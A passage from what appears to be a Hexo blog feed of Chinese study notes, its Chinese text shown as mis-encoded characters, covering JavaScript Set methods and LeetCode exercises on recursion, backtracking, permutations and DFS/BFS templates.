class="number">4</span>]);</span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹æ–¹æ³•"><a href="#å®ä¾‹æ–¹æ³•" class="headerlink" title="å®ä¾‹æ–¹æ³•"></a><strong>å®ä¾‹æ–¹æ³•</strong></h3><ul><li>add(value)ï¼šæ·»åŠ æŸä¸ªå€¼ï¼Œè¿”å› Set ç»“æ„æœ¬èº«</li><li>ldelete(value)ï¼šåˆ é™¤æŸä¸ªå€¼ï¼Œè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºåˆ é™¤æ˜¯å¦æˆåŠŸ</li><li>has(value)ï¼šè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè¯¥å€¼æ˜¯å¦ä¸º Set çš„æˆå‘˜</li><li>clear()ï¼šæ¸…é™¤æ‰€æœ‰æˆå‘˜ï¼Œæ²¡æœ‰è¿”å›å€¼</li></ul><h3 id="éå†"><a href="#éå†" class="headerlink" title="éå†"></a><strong>éå†</strong></h3><p>Set ç»“æ„çš„å®ä¾‹ä¸æ•°ç»„ä¸€æ ·ï¼Œä¹Ÿæ‹¥æœ‰forEachæ–¹æ³•ï¼Œç”¨äºå¯¹æ¯ä¸ªæˆå‘˜æ‰§è¡ŒæŸç§æ“ä½œï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.forEach(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(value))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯æˆ‘åœ¨è·Ÿå­¦&lt;a href=&quot;https://www.bilibili.com/video/BV1Kt411w7MP&quot;&gt;Bç«™javascr</summary>
      
    
    
    
    <category term="é˜…è¯»ç¬”è®°" scheme="http://example.com/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="JavaScript" scheme="http://example.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢æ–‡ç« </title>
    <link href="http://example.com/2021/05/30/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/"/>
    <id>http://example.com/2021/05/30/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/</id>
    <published>2021-05-30T08:58:31.000Z</published>
    <updated>2021-06-10T14:12:15.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HELLO-WORLDï¼"><a href="#HELLO-WORLDï¼" class="headerlink" title="HELLO WORLDï¼"></a>HELLO WORLDï¼</h1><h1 id="ä¸ªäººåšå®¢æ­å»ºè®°å½•"><a href="#ä¸ªäººåšå®¢æ­å»ºè®°å½•" class="headerlink" title="ä¸ªäººåšå®¢æ­å»ºè®°å½•"></a>ä¸ªäººåšå®¢æ­å»ºè®°å½•</h1><h3 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HELLO-WORLDï¼&quot;&gt;&lt;a href=&quot;#HELLO-WORLDï¼&quot; class=&quot;headerlink&quot; title=&quot;HELLO WORLDï¼&quot;&gt;&lt;/a&gt;HELLO WORLDï¼&lt;/h1&gt;&lt;h1 id=&quot;ä¸ªäººåšå®¢æ­å»ºè®°å½•&quot;&gt;&lt;a href=&quot;#ä¸ªäººåšå®¢æ­</summary>
      
    
    
    
    <category term="Hexo" scheme="http://example.com/categories/Hexo/"/>
    
    
    <category term="è®°å½•" scheme="http://example.com/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ã€ç®—æ³•ã€‘â€” â€” åˆ†æ²»ã€å›æº¯</title>
    <link href="http://example.com/2021/05/30/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E2%80%94%20%E2%80%94%20%E5%88%86%E6%B2%BB%E3%80%81%E5%9B%9E%E6%BA%AF/"/>
    <id>http://example.com/2021/05/30/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E2%80%94%20%E2%80%94%20%E5%88%86%E6%B2%BB%E3%80%81%E5%9B%9E%E6%BA%AF/</id>
    <published>2021-05-30T08:58:31.000Z</published>
    <updated>2021-09-12T11:40:36.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h1><p>æ¨¡æ¿ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recur</span>(<span class="params">level, param</span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// terminator</span></span><br><span class="line">    <span class="keyword">if</span> (level &gt; MAX_LEVEL) &#123;</span><br><span class="line">        <span class="comment">// process result</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// process current logic</span></span><br><span class="line">    process(level, param);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// drill down</span></span><br><span class="line">    recur(level + <span class="number">1</span>, newParam);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// restore current status</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åˆ†æ²»ã€å›æº¯"><a href="#åˆ†æ²»ã€å›æº¯" class="headerlink" title="åˆ†æ²»ã€å›æº¯"></a>åˆ†æ²»ã€å›æº¯</h1><p>åˆ†æ²»æ¨¡æ¿ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">divide_conquer</span>(<span class="params">problem, param1, param2, ...</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// recursion terminator</span></span><br><span class="line">    <span class="keyword">if</span> (problem is None) &#123;</span><br><span class="line">        print_result</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare data (æ‹†åˆ†å­é—®é¢˜)</span></span><br><span class="line">    data = prepare_data(problem);</span><br><span class="line">    subproblems = split_problem(problem, data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// conquer subproblems (drill down)</span></span><br><span class="line">    subresult1 = divide_conquer(subproblems[<span class="number">0</span>], p1, ...);</span><br><span class="line">    subresult2 = divide_conquer(subproblems[<span class="number">1</span>], p2, ...);</span><br><span class="line">    subresult3 = divide_conquer(subproblems[<span class="number">2</span>], p3, ...);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// process and generate the final result </span></span><br><span class="line">    result = process_result(subresult1, subresult2, subresult3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// revert the current level states(å›å¤å½“å‰å±‚çŠ¶æ€)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›æº¯æ¨¡æ¿ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">result = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backtrack</span> (<span class="params">path, list</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (æ»¡è¶³æ¡ä»¶) &#123;</span><br><span class="line">        result.push(path);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> () &#123;</span><br><span class="line">        <span class="comment">// åšé€‰æ‹©(å‰åºéå†)</span></span><br><span class="line">        backtrack (path, list)</span><br><span class="line">        <span class="comment">// æ’¤é”€é€‰æ‹©(åç»­éå†)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode50â€”â€”Pow-x-n-ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode50â€”â€”Pow-x-n-ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode50â€”â€”Pow(x, n)ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode50â€”â€”Pow(x, n)ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/powx-n/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç "><a href="#è‡ªå·±çš„ä»£ç " class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myPow = <span class="function"><span class="keyword">function</span> (<span class="params">x, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="number">1</span>;</span><br><span class="line">    x = n &gt; <span class="number">0</span> ? x : <span class="number">1</span> / x;</span><br><span class="line">    n = n &gt; <span class="number">0</span> ? n : -n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        res *= x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡è¿‡ã€‚æ—¶é—´å¤æ‚åº¦O(N)ï¼Œä½†æ˜¯å·²ç»è¶…è¿‡è¿è¡Œæ—¶é—´äº†ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£"><a href="#æ€è·¯-amp-é¢˜è§£" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>åˆ†æ²»ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myPow = <span class="function"><span class="keyword">function</span> (<span class="params">x, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> pow = <span class="built_in">Math</span>.abs(n);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨åˆ†æ²»ï¼šnæ˜¯å¥‡æ•°ï¼Œxçš„næ¬¡æ–¹ç­‰äº x*xçš„n-1æ¬¡æ–¹(è½¬åŒ–ä¸ºå¶æ•°)ï¼›næ˜¯å¶æ•° ç­‰äºï¼ˆx*xï¼‰çš„n/2æ¬¡æ–¹</span></span><br><span class="line">    <span class="keyword">let</span> result = pow % <span class="number">2</span> === <span class="number">0</span> ? myPow(x * x, pow / <span class="number">2</span>) : myPow(x * x, (pow - <span class="number">1</span>) / <span class="number">2</span>) * x</span><br><span class="line">    <span class="keyword">return</span> n &lt; <span class="number">0</span> ? <span class="number">1</span> / result : result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode78â€”â€”å­é›†ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode78â€”â€”å­é›†ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode78â€”â€”å­é›†ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode78â€”â€”å­é›†ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/subsets/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -1"><a href="#è‡ªå·±çš„ä»£ç -1" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> subsets = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [[]];</span><br><span class="line">    <span class="keyword">for</span> (num <span class="keyword">in</span> nums) &#123;</span><br><span class="line">        <span class="keyword">let</span> arr = [];</span><br><span class="line">        <span class="keyword">for</span> (subset <span class="keyword">in</span> res) &#123;</span><br><span class="line">            arr.push(subset + [num]);</span><br><span class="line">        &#125;</span><br><span class="line">        res.push(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ²¡è¿‡ï¼Œä¸”ä¸çŸ¥é“å“ªå‡ºé—®é¢˜äº†ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£"><a href="#æ€è·¯1-amp-é¢˜è§£" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>è¿­ä»£ï¼šä¾æ¬¡æŠŠæ¯ä¸ªå…ƒç´ æ’å…¥åˆ°ä¹‹å‰çš„é›†åˆä¸­ç”Ÿæˆæ–°çš„ç»“æœé›†åˆã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> subsets = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [[]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> arr = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; res.length; j++) &#123;</span><br><span class="line">            arr.push([...res[j], nums[i]]);</span><br><span class="line">        &#125;</span><br><span class="line">        res.push(...arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// æ›´ä¼˜å†™æ³• forEach</span></span><br><span class="line"><span class="keyword">var</span> subsets = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> res = [[]]</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">res.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">res.push([...item, nums[i]])</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç©ºé—´å¤æ‚åº¦: O(n*2^n)</li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£"><a href="#æ€è·¯2-amp-é¢˜è§£" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>åˆ†æ²»ï¼šï¼ˆå›æº¯ï¼Ÿï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> subsets = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> res = []</span><br><span class="line">backtrack(<span class="number">0</span>, [])</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backtrack</span>(<span class="params">index, curr</span>) </span>&#123;</span><br><span class="line">res.push(curr)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = index; i &lt; nums.length; i++) &#123;</span><br><span class="line">backtrack(i + <span class="number">1</span>, [...curr, nums[i]])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿç€è°ƒè¯•äº†ä¸€éï¼Œè¿˜æ˜¯æ²¡æ€ä¹ˆç†è§£ã€‚</p><h2 id="LeetCode77â€”â€”ç»„åˆï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode77â€”â€”ç»„åˆï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode77â€”â€”ç»„åˆï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode77â€”â€”ç»„åˆï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/combinations/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -2"><a href="#è‡ªå·±çš„ä»£ç -2" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> combine = <span class="function"><span class="keyword">function</span>(<span class="params">n, k</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> res = []</span><br><span class="line">backtrack(<span class="number">1</span>, [])</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backtrack</span>(<span class="params">index, curr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (curr.length === k) &#123;</span><br><span class="line">            res.push(curr)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = index; i &lt;= n; i++) &#123;</span><br><span class="line">backtrack(i + <span class="number">1</span>, [...curr, i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ACï¼Œå¯¹ç…§78æ€è·¯ï¼Œå‹‰å¼ºèƒ½åšï¼Œä½†æ˜¯é‡æ–°å¼€å§‹å°±ä¸ä¸€å®šã€‚</p><h2 id="LeetCode17â€”â€”ç”µè¯å·ç çš„å­—æ¯ç»„åˆï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode17â€”â€”ç”µè¯å·ç çš„å­—æ¯ç»„åˆï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode17â€”â€”ç”µè¯å·ç çš„å­—æ¯ç»„åˆï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode17â€”â€”ç”µè¯å·ç çš„å­—æ¯ç»„åˆï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -3"><a href="#è‡ªå·±çš„ä»£ç -3" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> letterCombinations = <span class="function"><span class="keyword">function</span>(<span class="params">digits</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (digits === <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ç›´æ¥ const map = &#123;2: &#x27;abc&#x27;, 3: &#x27;def&#x27;...&#125;</span></span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(), res = [];</span><br><span class="line">map.set(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;def&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;ghi&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;5&quot;</span>, <span class="string">&quot;jkl&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;mno&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;7&quot;</span>, <span class="string">&quot;pqrs&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;8&quot;</span>, <span class="string">&quot;tuv&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;9&quot;</span>, <span class="string">&quot;wxyz&quot;</span>);</span><br><span class="line"><span class="comment">// sä¸ºæ¯ä¸€æ¬¡å›æº¯çš„å­—ç¬¦ä¸²ï¼Œlevelä¸ºä¸ªæ•°</span></span><br><span class="line"><span class="keyword">const</span> search = <span class="function"><span class="keyword">function</span> (<span class="params">s, level</span>) </span>&#123;</span><br><span class="line"><span class="comment">// 1.ç»ˆæ­¢æ¡ä»¶ terminator</span></span><br><span class="line"><span class="keyword">if</span> (level === digits.length) &#123;</span><br><span class="line">res.push(s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.å•å±‚é€’å½’é€»è¾‘ process</span></span><br><span class="line"><span class="keyword">let</span> letter = map.get(digits[level]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; letter.length; i++)&#123;</span><br><span class="line"><span class="comment">// drill down</span></span><br><span class="line">search(s + letter[i], level + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">search(<span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC</p><h2 id="LeetCode46â€”â€”å…¨æ’åˆ—ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode46â€”â€”å…¨æ’åˆ—ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode46â€”â€”å…¨æ’åˆ—ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode46â€”â€”å…¨æ’åˆ—ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/permutations/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -4"><a href="#è‡ªå·±çš„ä»£ç -4" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> permute = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> res = [], length = nums.length;</span><br><span class="line"><span class="keyword">const</span> helper = <span class="function"><span class="keyword">function</span> (<span class="params">level, arr</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (level == length) &#123;</span><br><span class="line">res.push([...arr]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (arr.indexOf(nums[i]) === -<span class="number">1</span>) &#123;</span><br><span class="line">helper(level + <span class="number">1</span>, arr + [nums[i]]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">helper(<span class="number">0</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>æœªACï¼Œæµ‹è¯•æ¡ˆä¾‹ä¸º[0,-1,1]æ—¶ï¼Œé€šè¿‡<code>...arr</code> æ— æ³•åˆ†ç¦»-1ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-1"><a href="#æ€è·¯-amp-é¢˜è§£-1" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>å›æº¯ï¼šå…·ä½“è§<a href="https://leetcode-cn.com/problems/permutations/solution/chou-xiang-cheng-jue-ce-shu-yi-ge-pai-lie-jiu-xian/">https://leetcode-cn.com/problems/permutations/solution/chou-xiang-cheng-jue-ce-shu-yi-ge-pai-lie-jiu-xian/</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> permute = <span class="function"><span class="keyword">function</span>(<span class="params">letters</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [];</span><br><span class="line"><span class="keyword">const</span> dfs =<span class="function"><span class="keyword">function</span>(<span class="params">path, used</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (path.length == letters.length) &#123;</span><br><span class="line">res.push(<span class="built_in">Array</span>.from(path));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; letters.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (used[i]) <span class="keyword">continue</span>;</span><br><span class="line">path.push(letters[i]);</span><br><span class="line">used[i] = <span class="literal">true</span>;</span><br><span class="line">dfs(path, used);</span><br><span class="line"><span class="comment">// reverse state</span></span><br><span class="line">path.pop();        <span class="comment">// ä¸Šä¸€å¥çš„é€’å½’ç»“æŸï¼Œå›æº¯ï¼Œå°†æœ€åé€‰çš„æ•°popå‡ºæ¥</span></span><br><span class="line">used[i] = <span class="literal">false</span>;   <span class="comment">// æ’¤é”€è¿™ä¸ªè®°å½•</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">dfs([], <span class="built_in">Array</span>(letters.length).fill(<span class="literal">false</span>));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode47â€”â€”å…¨æ’åˆ—â…¡ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode47â€”â€”å…¨æ’åˆ—â…¡ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode47â€”â€”å…¨æ’åˆ—â…¡ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode47â€”â€”å…¨æ’åˆ—â…¡ï¼ˆâ˜†â˜†ï¼‰</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> permuteUnique = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [], remain = [], set = <span class="keyword">new</span> <span class="built_in">Set</span>(nums);</span><br><span class="line">    nums.forEach(<span class="function"><span class="params">num</span> =&gt;</span> remain[num] ? remain[num]++ : remain[num] = <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dfs</span>(<span class="params">depth, cur</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == nums.length) &#123;</span><br><span class="line">            res.push(cur.slice());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> num <span class="keyword">of</span> set) &#123;</span><br><span class="line">            <span class="keyword">if</span> (remain[num]) &#123;</span><br><span class="line">                cur.push(num);</span><br><span class="line">                remain[num]--;</span><br><span class="line">                <span class="comment">// move to the next depth</span></span><br><span class="line">                dfs(depth + <span class="number">1</span>, cur);</span><br><span class="line">                <span class="comment">// backtrack to previous state</span></span><br><span class="line">                cur.pop();</span><br><span class="line">                remain[num]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dfs(<span class="number">0</span>, []);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="BFSã€DFS"><a href="#BFSã€DFS" class="headerlink" title="BFSã€DFS"></a>BFSã€DFS</h1><h2 id="DFSä»£ç â€”â€”é€’å½’å†™æ³•æ¨¡æ¿"><a href="#DFSä»£ç â€”â€”é€’å½’å†™æ³•æ¨¡æ¿" class="headerlink" title="DFSä»£ç â€”â€”é€’å½’å†™æ³•æ¨¡æ¿"></a>DFSä»£ç â€”â€”é€’å½’å†™æ³•æ¨¡æ¿</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">visited = <span class="built_in">set</span>();</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">node, visited</span>):</span></span><br><span class="line">  <span class="keyword">if</span> node <span class="keyword">in</span> visited:</span><br><span class="line">    <span class="comment"># terminator already visited</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">  visited.add(node);</span><br><span class="line">  <span class="comment"># process current node here</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> next_node <span class="keyword">in</span> node.children():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> next_node <span class="keyword">in</span> visited:</span><br><span class="line">      dfs(next_node,visited)</span><br></pre></td></tr></table></figure><h2 id="DFSä»£ç â€”â€”éé€’å½’å†™æ³•æ¨¡æ¿"><a href="#DFSä»£ç â€”â€”éé€’å½’å†™æ³•æ¨¡æ¿" class="headerlink" title="DFSä»£ç â€”â€”éé€’å½’å†™æ³•æ¨¡æ¿"></a>DFSä»£ç â€”â€”éé€’å½’å†™æ³•æ¨¡æ¿</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">self, tree</span>):</span></span><br><span class="line">  <span class="keyword">if</span> tree.root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">  visited, stack = [], [tree.root]  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> stack:</span><br><span class="line">    node = stack.pop()</span><br><span class="line">    visited.add(node)</span><br><span class="line">    </span><br><span class="line">    process(node)</span><br><span class="line">    nodes=generate_related_nodes(node)</span><br><span class="line">    stack.push(nodes)</span><br></pre></td></tr></table></figure><h2 id="BFSä»£ç â€”â€”æ¨¡æ¿"><a href="#BFSä»£ç â€”â€”æ¨¡æ¿" class="headerlink" title="BFSä»£ç â€”â€”æ¨¡æ¿"></a>BFSä»£ç â€”â€”æ¨¡æ¿</h2><figure class="highlight 